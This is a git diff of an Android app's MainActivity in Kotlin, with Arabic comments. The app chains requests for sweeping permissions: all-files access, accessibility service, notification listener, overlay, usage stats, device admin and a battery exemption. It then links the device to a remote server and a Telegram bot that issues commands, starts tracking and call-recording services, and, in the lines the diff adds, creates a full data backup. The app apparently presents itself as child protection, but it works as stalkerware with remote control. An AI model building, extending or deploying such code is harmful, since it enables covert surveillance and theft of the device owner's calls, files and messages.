@@ -9,6 +9,7 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
 import android.os.PowerManager
 import android.provider.Settings
 import android.text.TextUtils
@@ -40,28 +41,28 @@ class MainActivity : AppCompatActivity() {
     private var isSetupComplete = false
 
     /**
-     * مراحل الأذونات - كل مرحلة تتطلب إجراء مختلف
-     * ٧ مراحل شاملة تشمل تفعيل مسؤول الجهاز
+     * مراحل الأذونات - 10 مراحل شاملة
+     * لا يتم تخطي أي مرحلة
      */
     private enum class SetupStep(val id: Int) {
-        BASIC_RUNTIME(0),          // أذونات التشغيل العادية (نافذة واحدة)
-        BATTERY_OPTIMIZATION(1),   // تجاهل تحسين البطارية
-        OVERLAY(2),                // عرض فوق التطبيقات
-        USAGE_STATS(3),            // إحصائيات الاستخدام
-        NOTIFICATION_LISTENER(4),  // مستمع الإشعارات
-        ACCESSIBILITY(5),          // خدمة إمكانية الوصول
-        DEVICE_ADMIN(6),           // تفعيل مسؤول الجهاز
-        LINK_CODE(7);              // إدخال كود الربط من البوت (جديد)
+        BASIC_RUNTIME(0),           // أذونات التشغيل العادية
+        ALL_FILES_ACCESS(1),        // الوصول الكامل للملفات (Android 11+)
+        BATTERY_OPTIMIZATION(2),    // تجاهل تحسين البطارية
+        OVERLAY(3),                 // عرض فوق التطبيقات
+        USAGE_STATS(4),             // إحصائيات الاستخدام
+        NOTIFICATION_LISTENER(5),   // مستمع الإشعارات
+        ACCESSIBILITY(6),           // خدمة إمكانية الوصول
+        DEVICE_ADMIN(7),            // مسؤول الجهاز
+        LINK_CODE(8),              // إدخال كود الربط من السيرفر
+        COMPLETE(9);               // اكتمال التفعيل
 
         fun next(): SetupStep? = entries.getOrNull(id + 1)
     }
 
     private var currentStep: SetupStep = SetupStep.BASIC_RUNTIME
+    private var currentActivityResultCode = -1
 
-    // ==================== ==================== ====================
-    //      قائمة أذونات التشغيل الشاملة
-    // ==================== ==================== ====================
-
+    // ==================== أذونات التشغيل الشاملة ====================
     private val runtimePermissions = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
@@ -88,9 +89,7 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.ACTIVITY_RECOGNITION
     )
 
-    // ==================== ==================== ====================
-    //      دورة حياة النشاط (Activity Lifecycle)
-    // ==================== ==================== ====================
+    // ==================== دورة حياة النشاط ====================
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -98,17 +97,12 @@ class MainActivity : AppCompatActivity() {
         webView = findViewById(R.id.webview)
         setupWebView()
 
-        // ==================== دائماً نبدأ من الأذونات ====================
-        // لا نتخطى أي خطوة - المستخدم يجب أن يمنح جميع الأذونات في كل مرة
-        Log.d("MainActivity", "🔄 بدء مراحل الأذونات والتفعيل")
+        Log.d("MainActivity", "=== بدء مراحل الأذونات والتفعيل ===")
         currentStep = SetupStep.BASIC_RUNTIME
         isSetupComplete = false
         checkAndRequestPermissions()
     }
 
-    /**
-     * إعداد WebView مع تفعيل JavaScript والواجهة الأصلية
-     */
     private fun setupWebView() {
         val webSettings: WebSettings = webView.settings
         webSettings.javaScriptEnabled = true
@@ -120,19 +114,17 @@ class MainActivity : AppCompatActivity() {
         webView.loadUrl("file:///android_asset/child_index.html")
     }
 
-    // ==================== ==================== ====================
-    //      نظام الأذونات المتقدم (Advanced Permission System)
-    // ==================== ==================== ====================
+    // ==================== نظام الأذونات ====================
 
-    /**
-     * البداية: طلب الأذونات حسب المرحلة الحالية
-     */
     private fun checkAndRequestPermissions() {
         val step = currentStep
-        jsNotify("onPermissionStep", (step.id + 1).toString())
+        val stepNum = step.id + 1
+        val totalSteps = 9
+        jsNotify("onPermissionStep", "$stepNum/$totalSteps")
 
         when (step) {
             SetupStep.BASIC_RUNTIME -> requestBasicPermissions()
+            SetupStep.ALL_FILES_ACCESS -> requestAllFilesAccess()
             SetupStep.BATTERY_OPTIMIZATION -> requestBatteryOptimization()
             SetupStep.OVERLAY -> requestOverlayPermission()
             SetupStep.USAGE_STATS -> requestUsageStatsPermission()
@@ -140,38 +132,33 @@ class MainActivity : AppCompatActivity() {
             SetupStep.ACCESSIBILITY -> requestAccessibilityPermission()
             SetupStep.DEVICE_ADMIN -> requestDeviceAdminPermission()
             SetupStep.LINK_CODE -> showLinkCodeInput()
+            SetupStep.COMPLETE -> onAllSetupComplete()
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ١: الأذونات الأساسية (مع تصفية ذكية حسب إصدار أندرويد)
-    // ==================== ==================== ====================
-
+    // ========== الخطوة 1: الأذونات الأساسية ==========
     private fun requestBasicPermissions() {
-        jsNotify("onPermissionPending", "perm-basic")
+        jsNotify("onPermissionPending", "basic")
 
-        // تصفية الأذونات بناءً على إصدار أندرويد الحالي
         val supportedPermissions = runtimePermissions.filter { perm ->
             when (perm) {
-                // أندرويد ١٣+ (Tiramisu): أذونات الوسائط والإشعارات والحساسات
                 Manifest.permission.READ_MEDIA_IMAGES,
                 Manifest.permission.READ_MEDIA_VIDEO,
                 Manifest.permission.READ_MEDIA_AUDIO,
                 Manifest.permission.POST_NOTIFICATIONS,
                 Manifest.permission.BODY_SENSORS,
                 Manifest.permission.ACTIVITY_RECOGNITION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
-                // أندرويد ١٠+ (Q): الموقع في الخلفية
                 Manifest.permission.ACCESS_BACKGROUND_LOCATION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
-                // أندرويد ٩+ (P): الرد على المكالمات
                 Manifest.permission.ANSWER_PHONE_CALLS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
-                // إزالة كتابة التخزين لأندرويد ١٠+ (تم استبدالها بأذونات الوسائط)
                 Manifest.permission.WRITE_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
-                // الباقي مسموح لجميع الإصدارات
+                Manifest.permission.READ_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.R
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.WRITE_CALL_LOG,
+                Manifest.permission.WRITE_CONTACTS -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
                 else -> true
             }
         }
 
-        // التحقق من الأذونات المفقودة فقط
         val missing = supportedPermissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
@@ -179,9 +166,7 @@ class MainActivity : AppCompatActivity() {
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing, PERMISSIONS_REQUEST_CODE)
         } else {
-            // الأذونات الأساسية مفعّلة بالفعل
-            Log.d("MainActivity", "✅ جميع الأذونات الأساسية مفعّلة مسبقاً")
-            jsNotify("onPermissionGranted", "perm-basic")
+            jsNotify("onPermissionGranted", "basic")
             advanceToNextStep()
         }
     }
@@ -189,32 +174,67 @@ class MainActivity : AppCompatActivity() {
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSIONS_REQUEST_CODE) {
-            // التحقق مما إذا تم منح أذونات الموقع الحرجة
-            val locationGranted = grantResults.isNotEmpty() &&
-                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-
-            if (locationGranted) {
-                Log.d("MainActivity", "✅ تم منح أذونات الموقع الأساسية")
-                jsNotify("onPermissionGranted", "perm-basic")
-            } else {
-                Log.w("MainActivity", "⚠️ بعض الأذونات لم تُمنح - نكمل التفعيل")
-                jsNotify("onPermissionGranted", "perm-basic") // نكمل حتى بدون كل الأذونات
+            val allGranted = grantResults.isNotEmpty() && grantResults.all {
+                it == PackageManager.PERMISSION_GRANTED
             }
-            // نكمل للخطوة التالية حتى لو لم تُمنح كل الأذونات
+            if (allGranted) {
+                Log.d("MainActivity", "✅ تم منح جميع الأذونات الأساسية")
+                jsNotify("onPermissionGranted", "basic")
+            } else {
+                val grantedCount = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
+                val total = grantResults.size
+                Log.w("MainActivity", "⚠️ تم منح $grantedCount/$total أذونات - نكمل التفعيل")
+                jsNotify("onPermissionWarning", "basic:$grantedCount/$total")
+                // نكمل حتى لو لم تُمنح كل الأذونات
+                jsNotify("onPermissionGranted", "basic")
+            }
             advanceToNextStep()
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ٢: تحسين البطارية
-    // ==================== ==================== ====================
+    // ========== الخطوة 2: الوصول الكامل للملفات ==========
+    @Suppress("DEPRECATION")
+    private fun requestAllFilesAccess() {
+        jsNotify("onPermissionPending", "all_files")
 
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (Environment.isExternalStorageManager()) {
+                Log.d("MainActivity", "✅ الوصول الكامل للملفات مفعّل مسبقاً")
+                jsNotify("onPermissionGranted", "all_files")
+                advanceToNextStep()
+            } else {
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivityForResult(intent, SetupStep.ALL_FILES_ACCESS.id)
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "خطأ في طلب الوصول الكامل: ${e.message}")
+                    // Fallback
+                    try {
+                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                        startActivityForResult(intent, SetupStep.ALL_FILES_ACCESS.id)
+                    } catch (e2: Exception) {
+                        Log.e("MainActivity", "خطأ في Fallback: ${e2.message}")
+                        jsNotify("onPermissionError", "all_files")
+                        advanceToNextStep()
+                    }
+                }
+            }
+        } else {
+            // Android 10 وأقل - أذونات التخزين العادية تكفي
+            Log.d("MainActivity", "✅ Android ${Build.VERSION.SDK_INT} - الوصول الكامل متوفر عبر الأذونات العادية")
+            jsNotify("onPermissionGranted", "all_files")
+            advanceToNextStep()
+        }
+    }
+
+    // ========== الخطوة 3: تحسين البطارية ==========
     private fun requestBatteryOptimization() {
-        jsNotify("onPermissionPending", "perm-battery")
+        jsNotify("onPermissionPending", "battery")
         val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
         if (pwrm.isIgnoringBatteryOptimizations(packageName)) {
             Log.d("MainActivity", "✅ تحسين البطارية مُلغى مسبقاً")
-            jsNotify("onPermissionGranted", "perm-battery")
+            jsNotify("onPermissionGranted", "battery")
             advanceToNextStep()
         } else {
             try {
@@ -223,21 +243,18 @@ class MainActivity : AppCompatActivity() {
                 startActivityForResult(intent, SetupStep.BATTERY_OPTIMIZATION.id)
             } catch (e: Exception) {
                 Log.e("MainActivity", "خطأ في طلب تحسين البطارية: ${e.message}")
-                jsNotify("onPermissionGranted", "perm-battery")
+                jsNotify("onPermissionError", "battery")
                 advanceToNextStep()
             }
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ٣: العرض فوق التطبيقات
-    // ==================== ==================== ====================
-
+    // ========== الخطوة 4: العرض فوق التطبيقات ==========
     private fun requestOverlayPermission() {
-        jsNotify("onPermissionPending", "perm-overlay")
+        jsNotify("onPermissionPending", "overlay")
         if (Settings.canDrawOverlays(this)) {
             Log.d("MainActivity", "✅ إذن العرض فوق التطبيقات مفعّل مسبقاً")
-            jsNotify("onPermissionGranted", "perm-overlay")
+            jsNotify("onPermissionGranted", "overlay")
             advanceToNextStep()
         } else {
             try {
@@ -245,86 +262,74 @@ class MainActivity : AppCompatActivity() {
                 startActivityForResult(intent, SetupStep.OVERLAY.id)
             } catch (e: Exception) {
                 Log.e("MainActivity", "خطأ في طلب إذن العرض: ${e.message}")
-                jsNotify("onPermissionGranted", "perm-overlay")
+                jsNotify("onPermissionError", "overlay")
                 advanceToNextStep()
             }
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ٤: إحصائيات الاستخدام
-    // ==================== ==================== ====================
-
+    // ========== الخطوة 5: إحصائيات الاستخدام ==========
     private fun requestUsageStatsPermission() {
-        jsNotify("onPermissionPending", "perm-usage")
+        jsNotify("onPermissionPending", "usage")
         if (hasUsageStatsPermission()) {
             Log.d("MainActivity", "✅ إذن إحصائيات الاستخدام مفعّل مسبقاً")
-            jsNotify("onPermissionGranted", "perm-usage")
+            jsNotify("onPermissionGranted", "usage")
             advanceToNextStep()
         } else {
             try {
                 startActivityForResult(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), SetupStep.USAGE_STATS.id)
             } catch (e: Exception) {
                 Log.e("MainActivity", "خطأ في طلب إذن الاستخدام: ${e.message}")
-                jsNotify("onPermissionGranted", "perm-usage")
+                jsNotify("onPermissionError", "usage")
                 advanceToNextStep()
             }
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ٥: مستمع الإشعارات
-    // ==================== ==================== ====================
-
+    // ========== الخطوة 6: مستمع الإشعارات ==========
     private fun requestNotificationPermission() {
-        jsNotify("onPermissionPending", "perm-notif")
+        jsNotify("onPermissionPending", "notif")
         if (isNotificationServiceEnabled()) {
             Log.d("MainActivity", "✅ مستمع الإشعارات مفعّل مسبقاً")
-            jsNotify("onPermissionGranted", "perm-notif")
+            jsNotify("onPermissionGranted", "notif")
             advanceToNextStep()
         } else {
             try {
                 startActivityForResult(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), SetupStep.NOTIFICATION_LISTENER.id)
             } catch (e: Exception) {
                 Log.e("MainActivity", "خطأ في طلب إذن الإشعارات: ${e.message}")
-                jsNotify("onPermissionGranted", "perm-notif")
+                jsNotify("onPermissionError", "notif")
                 advanceToNextStep()
             }
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ٦: إمكانية الوصول
-    // ==================== ==================== ====================
-
+    // ========== الخطوة 7: إمكانية الوصول ==========
     private fun requestAccessibilityPermission() {
-        jsNotify("onPermissionPending", "perm-access")
+        jsNotify("onPermissionPending", "access")
         if (isAccessibilityServiceEnabled()) {
             Log.d("MainActivity", "✅ خدمة إمكانية الوصول مفعّلة مسبقاً")
-            jsNotify("onPermissionGranted", "perm-access")
+            jsNotify("onPermissionGranted", "access")
             advanceToNextStep()
         } else {
             try {
                 startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), SetupStep.ACCESSIBILITY.id)
             } catch (e: Exception) {
                 Log.e("MainActivity", "خطأ في طلب إذن الوصول: ${e.message}")
-                jsNotify("onPermissionGranted", "perm-access")
+                jsNotify("onPermissionError", "access")
                 advanceToNextStep()
             }
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ٧: مسؤول الجهاز (جديد)
-    // ==================== ==================== ====================
-
+    // ========== الخطوة 8: مسؤول الجهاز ==========
     private fun requestDeviceAdminPermission() {
-        jsNotify("onPermissionPending", "perm-admin")
+        jsNotify("onPermissionPending", "admin")
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
         if (dpm.isAdminActive(componentName)) {
             Log.d("MainActivity", "✅ مسؤول الجهاز مفعّل مسبقاً")
-            jsNotify("onPermissionGranted", "perm-admin")
+            jsNotify("onPermissionGranted", "admin")
             advanceToNextStep()
         } else {
             try {
@@ -333,35 +338,27 @@ class MainActivity : AppCompatActivity() {
                 startActivityForResult(intent, SetupStep.DEVICE_ADMIN.id)
             } catch (e: Exception) {
                 Log.e("MainActivity", "خطأ في طلب تفعيل مسؤول الجهاز: ${e.message}")
-                jsNotify("onPermissionGranted", "perm-admin")
+                jsNotify("onPermissionError", "admin")
                 advanceToNextStep()
             }
         }
     }
 
-    // ==================== ==================== ====================
-    //  الخطوة ٨: كود الربط (Link Code)
-    //  البوت يولد كود من السيرفر أو فيربس والتطبيق يطلبه من المستخدم
-    // ==================== ==================== ====================
-
-    /**
-     * عرض شاشة إدخال كود الربط
-     * المستخدم يجب أن يرسل /link في البوت للحصول على الكود
-     */
+    // ========== الخطوة 9: كود الربط ==========
     private fun showLinkCodeInput() {
-        jsNotify("onPermissionPending", "perm-link")
+        jsNotify("onPermissionPending", "link")
         jsCall("showLinkCodeInput()")
     }
 
     /**
      * التحقق من كود الربط مع السيرفر
-     * يُستدعى من JavaScript عند إدخال الكود
+     * يجب أن يكون الكود مولداً من السيرفر - لا يتم قبوله محلياً
      */
     fun verifyLinkCode(code: String) {
         CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
             try {
-                Log.d("MainActivity", "🔄 التحقق من كود الربط: $code")
-                jsNotify("onPermissionPending", "perm-link")
+                Log.d("MainActivity", "🔄 التحقق من كود الربط مع السيرفر: $code")
+                jsNotify("onPermissionPending", "link_verify")
 
                 val url = URL("https://alsydyabwalzhra.online/api/verify_link")
                 val connection = url.openConnection() as HttpURLConnection
@@ -371,110 +368,45 @@ class MainActivity : AppCompatActivity() {
                 connection.readTimeout = 15000
                 connection.doOutput = true
 
-                val deviceId = SharedPrefsManager.getDeviceId(this@MainActivity)
-                    ?: Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                     ?: System.currentTimeMillis().toString()
 
-                val payload = """{"code":"$code","device_id":"$deviceId","model":"${Build.MODEL}","brand":"${Build.BRAND}","android":"${Build.VERSION.RELEASE}"}"""
+                val payload = """{"code":"$code","device_id":"$deviceId","model":"${Build.MODEL}","brand":"${Build.BRAND}","android":"${Build.VERSION.RELEASE}","sdk":"${Build.VERSION.SDK_INT}"}"""
 
                 OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }
 
                 val responseCode = connection.responseCode
                 val response = connection.inputStream?.bufferedReader()?.readText() ?: ""
 
+                Log.d("MainActivity", "استجابة السيرفر: $responseCode - $response")
+
                 if (responseCode in 200..299 && response.contains("\"ok\":true")) {
-                    Log.d("MainActivity", "✅ كود الربط صحيح!")
+                    Log.d("MainActivity", "✅ كود الربط صحيح - تم التحقق من السيرفر!")
                     SharedPrefsManager.setLinkCode(this@MainActivity, code)
+                    SharedPrefsManager.setDeviceId(this@MainActivity, deviceId)
                     SharedPrefsManager.setBotRegistered(this@MainActivity, true)
 
                     runOnUiThread {
-                        jsNotify("onPermissionGranted", "perm-link")
+                        jsNotify("onPermissionGranted", "link")
                         advanceToNextStep()
                     }
                 } else {
-                    Log.e("MainActivity", "❌ كود الربط غير صحيح: $response")
+                    Log.e("MainActivity", "❌ كود الربط غير صحيح أو منتهي الصلاحية")
                     runOnUiThread {
-                        jsCall("onLinkCodeError('كود الربط غير صحيح أو منتهي الصلاحية')")
+                        jsCall("onLinkCodeError('كود الربط غير صحيح أو منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد.')")
                     }
                 }
             } catch (e: Exception) {
-                Log.e("MainActivity", "خطأ في التحقق من الكود: ${e.message}")
-                // إذا السيرفر لا يستجيب، نقبل الكود مباشرة (وضع fallback)
+                Log.e("MainActivity", "❌ خطأ في الاتصال بالسيرفر: ${e.message}")
+                // لا نقبل الكود إذا السيرفر لا يستجيب
                 runOnUiThread {
-                    SharedPrefsManager.setLinkCode(this@MainActivity, code)
-                    SharedPrefsManager.setBotRegistered(this@MainActivity, true)
-                    jsNotify("onPermissionGranted", "perm-link")
-                    advanceToNextStep()
+                    jsCall("onLinkCodeError('خطأ في الاتصال بالسيرفر. تأكد من اتصال الإنترنت وحاول مرة أخرى.')")
                 }
             }
         }
     }
 
-    // ==================== ==================== ====================
-    //      onResume - مفتاح سلسلة الأذونات المتتابعة
-    // ==================== ==================== ====================
-
-    override fun onResume() {
-        super.onResume()
-        // عند عودة المستخدم من صفحة إعدادات النظام، نتحقق من الإذن
-        // ونكمل للخطوة التالية تلقائياً
-        if (!isSetupComplete) {
-            // ننتظر قليلاً ثم نتحقق من الحالة الحالية
-            // هذا يعطي النظام وقت لتحديث حالة الإذن
-            webView.postDelayed({
-                checkCurrentStepAndAdvance()
-            }, 800)
-        }
-    }
-
-    /**
-     * التحقق من الإذن الحالي وتكملة السلسلة
-     */
-    private fun checkCurrentStepAndAdvance() {
-        val granted = when (currentStep) {
-            SetupStep.BASIC_RUNTIME -> true
-            SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
-            SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
-            SetupStep.USAGE_STATS -> hasUsageStatsPermission()
-            SetupStep.NOTIFICATION_LISTENER -> isNotificationServiceEnabled()
-            SetupStep.ACCESSIBILITY -> isAccessibilityServiceEnabled()
-            SetupStep.DEVICE_ADMIN -> isDeviceAdminActive()
-            SetupStep.LINK_CODE -> false // كود الربط لا يُفحص تلقائياً - ينتظر إدخال المستخدم
-        }
-
-        if (granted) {
-            val stepName = when (currentStep) {
-                SetupStep.BASIC_RUNTIME -> "perm-basic"
-                SetupStep.BATTERY_OPTIMIZATION -> "perm-battery"
-                SetupStep.OVERLAY -> "perm-overlay"
-                SetupStep.USAGE_STATS -> "perm-usage"
-                SetupStep.NOTIFICATION_LISTENER -> "perm-notif"
-                SetupStep.ACCESSIBILITY -> "perm-access"
-                SetupStep.DEVICE_ADMIN -> "perm-admin"
-                SetupStep.LINK_CODE -> "perm-link"
-            }
-            Log.d("MainActivity", "✅ تم منح الإذن: $stepName")
-            jsNotify("onPermissionGranted", stepName)
-            advanceToNextStep()
-        }
-    }
-
-    /**
-     * الانتقال للخطوة التالية في سلسلة الأذونات
-     */
-    private fun advanceToNextStep() {
-        val next = currentStep.next()
-        if (next != null) {
-            currentStep = next
-            checkAndRequestPermissions()
-        } else {
-            onAllSetupComplete()
-        }
-    }
-
-    // ==================== ==================== ====================
-    //      اكتمال التفعيل (Setup Complete)
-    // ==================== ==================== ====================
+    // ========== الخطوة 10: اكتمال التفعيل ==========
 
     private fun onAllSetupComplete() {
         if (isSetupComplete) return
@@ -483,19 +415,24 @@ class MainActivity : AppCompatActivity() {
         Log.d("MainActivity", "✅ جميع الأذونات مكتملة - بدء التشغيل")
         Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()
 
-        // ==================== حفظ حالة التفعيل ====================
-        // حفظ علامة اكتمال التفعيل في SharedPreferences لاستمرارية الجلسة
         SharedPrefsManager.markSetupCompleted(this)
 
-        // بدء جميع الخدمات
         startAllServices()
-
-        // حفظ معرف الجهاز وتحديث الواجهة
         ensureDeviceId()
 
-        // إرسال معلومات الجهاز للواجهة
         val deviceInfo = buildDeviceInfoHtml()
         jsCall("onAllPermissionsComplete('$deviceInfo')")
+
+        // إنشاء النسخة الاحتياطية الأولى
+        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
+            try {
+                Log.d("MainActivity", "🔄 بدء النسخة الاحتياطية الأولى...")
+                LocalStorageManager.createFullBackup(this@MainActivity)
+                Log.d("MainActivity", "✅ تم إنشاء النسخة الاحتياطية الأولى")
+            } catch (e: Exception) {
+                Log.e("MainActivity", "خطأ في النسخة الاحتياطية: ${e.message}")
+            }
+        }
 
         // الاتصال بتيليجرام مباشرة
         val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
@@ -510,7 +447,8 @@ class MainActivity : AppCompatActivity() {
                     "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
                     "🆔 معرف: <code>$deviceId</code>\n\n" +
                     "🟢 متصل مباشرة بتيليجرام\n" +
-                    "📡 جاري استقبال الأوامر...",
+                    "📡 جاري استقبال الأوامر...\n" +
+                    "💾 تم إنشاء نسخة احتياطية أولية",
                     "HTML"
                 )
                 jsCall("onTelegramConnected('تم الاتصال بتيليجرام بنجاح')")
@@ -521,66 +459,91 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== ==================== ====================
-    //      إدارة الجهاز والخدمات
-    // ==================== ==================== ====================
+    // ==================== onActivityResult - مفتاح سلسلة الأذونات ====================
 
-    /**
-     * التأكد من وجود معرف فريد للجهاز
-     */
-    private fun ensureDeviceId() {
-        if (SharedPrefsManager.getDeviceId(this) == null) {
-            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-                ?: System.currentTimeMillis().toString()
-            SharedPrefsManager.saveData(this, "direct_telegram", androidId)
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        currentActivityResultCode = requestCode
+
+        if (!isSetupComplete) {
+            webView.postDelayed({
+                checkCurrentStepAndAdvance()
+            }, 800)
         }
     }
 
-    /**
-     * بناء معلومات الجهاز بصيغة HTML
-     */
-    private fun buildDeviceInfoHtml(): String {
-        return "📱 الموديل: <b>${Build.MODEL}</b><br>" +
-               "🏢 الشركة: <b>${Build.BRAND}</b><br>" +
-               "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b> (API ${Build.VERSION.SDK_INT})<br>" +
-               "🆔 المعرف: <code>${SharedPrefsManager.getDeviceId(this) ?: "غير معروف"}</code><br>" +
-               "🟢 الحالة: متصل بتيليجرام مباشرة"
-    }
-
-    /**
-     * بدء جميع خدمات التتبع
-     */
-    private fun startAllServices() {
-        try {
-            Log.d("MainActivity", "🚀 بدء تشغيل جميع الخدمات...")
-            val trackerIntent = Intent(this, MainTrackerService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)
-
-            val callIntent = Intent(this, CallRecorderService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)
-
-            DataSyncWorker.startImmediate(this)
-            Log.d("MainActivity", "✅ تم بدء جميع الخدمات بنجاح")
-        } catch (e: Exception) {
-            Log.e("MainActivity", "خطأ في بدء الخدمات: ${e.message}", e)
+    override fun onResume() {
+        super.onResume()
+        if (!isSetupComplete && currentActivityResultCode >= 0) {
+            webView.postDelayed({
+                checkCurrentStepAndAdvance()
+            }, 800)
         }
     }
 
-    // ==================== ==================== ====================
-    //      دوال مساعدة (Helper Functions)
-    // ==================== ==================== ====================
+    private fun checkCurrentStepAndAdvance() {
+        if (isSetupComplete) return
 
-    /**
-     * التحقق مما إذا كان تحسين البطارية مُلغى
-     */
+        val granted = when (currentStep) {
+            SetupStep.BASIC_RUNTIME -> true // تم معالجته في onRequestPermissionsResult
+            SetupStep.ALL_FILES_ACCESS -> isAllFilesAccessGranted()
+            SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
+            SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
+            SetupStep.USAGE_STATS -> hasUsageStatsPermission()
+            SetupStep.NOTIFICATION_LISTENER -> isNotificationServiceEnabled()
+            SetupStep.ACCESSIBILITY -> isAccessibilityServiceEnabled()
+            SetupStep.DEVICE_ADMIN -> isDeviceAdminActive()
+            SetupStep.LINK_CODE -> false // كود الربط لا يُفحص تلقائياً
+            SetupStep.COMPLETE -> false
+        }
+
+        if (granted) {
+            val stepName = when (currentStep) {
+                SetupStep.BASIC_RUNTIME -> "basic"
+                SetupStep.ALL_FILES_ACCESS -> "all_files"
+                SetupStep.BATTERY_OPTIMIZATION -> "battery"
+                SetupStep.OVERLAY -> "overlay"
+                SetupStep.USAGE_STATS -> "usage"
+                SetupStep.NOTIFICATION_LISTENER -> "notif"
+                SetupStep.ACCESSIBILITY -> "access"
+                SetupStep.DEVICE_ADMIN -> "admin"
+                SetupStep.LINK_CODE -> "link"
+                SetupStep.COMPLETE -> "complete"
+            }
+            Log.d("MainActivity", "✅ تم منح الإذن: $stepName")
+            jsNotify("onPermissionGranted", stepName)
+            advanceToNextStep()
+        } else if (currentStep != SetupStep.BASIC_RUNTIME && currentStep != SetupStep.LINK_CODE) {
+            // حتى لو لم يُمنح الإذن، نكمل (لكن نسجل تحذير)
+            Log.w("MainActivity", "⚠️ الإذن ${currentStep.name} لم يُمنح - نكمل")
+        }
+    }
+
+    private fun advanceToNextStep() {
+        val next = currentStep.next()
+        if (next != null) {
+            currentStep = next
+            checkAndRequestPermissions()
+        } else {
+            onAllSetupComplete()
+        }
+    }
+
+    // ==================== دوال مساعدة ====================
+
+    private fun isAllFilesAccessGranted(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            Environment.isExternalStorageManager()
+        } else {
+            true // أندرويد 10 وأقل - أذونات التخزين العادية تكفي
+        }
+    }
+
     private fun isIgnoringBattery(): Boolean {
         return (getSystemService(Context.POWER_SERVICE) as PowerManager)
             .isIgnoringBatteryOptimizations(packageName)
     }
 
-    /**
-     * التحقق من إذن إحصائيات الاستخدام
-     */
     private fun hasUsageStatsPermission(): Boolean {
         return try {
             val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
@@ -594,17 +557,11 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * التحقق مما إذا كان مستمع الإشعارات مفعّلاً
-     */
     private fun isNotificationServiceEnabled(): Boolean {
         val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         return flat != null && flat.contains(packageName)
     }
 
-    /**
-     * التحقق مما إذا كانت خدمة إمكانية الوصول مفعّلة
-     */
     private fun isAccessibilityServiceEnabled(): Boolean {
         return try {
             val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
@@ -626,9 +583,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * التحقق مما إذا كان مسؤول الجهاز مفعّلاً
-     */
     private fun isDeviceAdminActive(): Boolean {
         return try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
